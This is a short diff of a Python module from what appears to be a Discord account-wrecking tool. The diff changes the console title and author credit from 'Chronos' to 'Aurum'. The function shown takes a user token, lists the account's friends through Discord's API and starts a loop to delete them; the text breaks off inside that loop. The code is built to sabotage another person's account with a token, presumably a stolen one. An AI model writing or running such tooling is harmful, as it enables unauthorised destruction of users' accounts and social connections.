@@ -2,7 +2,7 @@ import requests
 from utils.common import *
 
 def deleteFriends(token):
-    set_console_title("Chronos V1 | Made by gokimax | Delete Friends")
+    set_console_title("Aurum v1 | Made by ZeltuxDev | Delete Friends")
     friendIds = requests.get("https://discord.com/api/v9/users/@me/relationships", headers=getheaders(token)).json()
     for friend in friendIds:
         try:
